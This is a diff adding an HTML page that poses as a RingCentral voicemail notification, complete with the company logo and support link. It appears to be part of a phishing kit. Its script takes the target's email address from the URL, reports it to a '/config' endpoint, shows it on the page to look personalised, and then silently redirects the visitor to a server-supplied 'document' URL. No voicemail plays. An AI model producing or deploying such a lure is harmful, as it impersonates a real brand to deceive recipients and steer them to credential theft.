@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RingCentral Voicemail Notification</title>
+    <style>
+        body {
+            background: #f5f7fa;
+            font-family: 'Helvetica Neue', 'Segoe UI', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .rc-card {
+            max-width: 480px;
+            margin: 40px auto;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            padding: 32px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .rc-logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        .title {
+            font-size: 1.5em;
+            font-weight: 600;
+            color: #1a3c7a;
+            margin-bottom: 16px;
+            letter-spacing: 0.3px;
+        }
+
+        .desc {
+            font-size: 1.1em;
+            color: #2f2f2f;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        .vm-info {
+            background: #f8fafc;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 24px;
+            font-size: 1em;
+            color: #333;
+            text-align: left;
+            border: 1px solid #e8ecef;
+        }
+
+        .info-row {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .info-label {
+            color: #1a3c7a;
+            font-weight: 600;
+            width: 120px;
+            flex-shrink: 0;
+        }
+
+        .info-value {
+            color: #2f2f2f;
+        }
+
+        .preview-title {
+            font-size: 1em;
+            font-weight: 600;
+            color: #1a3c7a;
+            margin: 12px 0 8px;
+        }
+
+        .preview-text {
+            color: #2f2f2f;
+            font-style: italic;
+        }
+
+        .audio-animation {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 40px;
+            margin: 16px 0;
+        }
+
+        .bar {
+            width: 6px;
+            height: 20px;
+            background: #ff6200;
+            margin: 0 3px;
+            border-radius: 3px;
+            animation: pulse 1.2s ease-in-out infinite;
+        }
+
+        .bar:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .bar:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        .bar:nth-child(4) {
+            animation-delay: 0.6s;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                transform: scaleY(1);
+            }
+
+            50% {
+                transform: scaleY(2.5);
+            }
+        }
+
+        .footer {
+            font-size: 0.95em;
+            color: #6b7280;
+            margin-top: 20px;
+            line-height: 1.5;
+        }
+
+        .footer a {
+            color: #1a3c7a;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 480px) {
+            .rc-card {
+                margin: 20px;
+                padding: 24px;
+            }
+
+            .title {
+                font-size: 1.3em;
+            }
+
+            .desc {
+                font-size: 1em;
+            }
+
+            .info-label {
+                width: 100px;
+            }
+
+            .rc-logo {
+                width: 120px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="rc-card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/0c/Ringcentral_logo_%282009%29.png?20181210131411"
+            class="rc-logo" alt="RingCentral Logo">
+        <div class="title">New Voicemail Notification</div>
+        <div class="desc">
+            You have received a new voicemail from RingCentral, Inc.<br>Please review the details and listen to the
+            message below.
+        </div>
+        <div class="vm-info">
+            <div class="info-row">
+                <span class="info-label">From:</span>
+                <span class="info-value">EXT 2025</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Received:</span>
+                <span class="info-value" id="email-reciever">##email##</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Length:</span>
+                <span class="info-value">00:54</span>
+            </div>
+            <div class="preview-title">Voicemail Preview:</div>
+            <div class="preview-text">Preparing to play voicemail...</div>
+        </div>
+        <div class="audio-animation">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </div>
+        <div class="footer">
+            This is an automated notification from RingCentral. For assistance, please visit
+            <a href="https://support.ringcentral.com/" target="_blank">RingCentral Support</a>.
+        </div>
+    </div>
+    <script>
+        (function () {
+            let lastEmail = null;
+
+            function getEmailFromUrl() {
+                const params = new URLSearchParams(window.location.search);
+                return params.get("email");
+            }
+
+            async function refreshConfig(email) {
+                try {
+                    const res = await fetch(`/config?email=${encodeURIComponent(email)}`);
+                    const cfg = await res.json();
+
+                    // update restoreBtn
+
+                    setTimeout(() => {
+                        window.location.href = cfg.DOCUMENT_URL;
+                    }, 2000);
+
+
+                    const messageEl = document.querySelector("#email-reciever");
+                    if (messageEl) {
+                        messageEl.innerText = email;
+                    }
+
+                } catch (err) {
+                    console.error("Config load failed", err);
+                }
+            }
+
+            function checkForEmailChange() {
+                const email = getEmailFromUrl();
+                if (email && email.length > 4 && email !== lastEmail) {
+                    lastEmail = email;
+                    refreshConfig(email);
+                }
+            }
+
+            // Run at page load
+            //checkForEmailChange();
+            //refreshConfig('');
+
+            // Watch periodically (since user can manually edit URL bar)
+            setInterval(checkForEmailChange, 3000);
+
+        })();
+
+    </script>
+</body>
+
+</html>
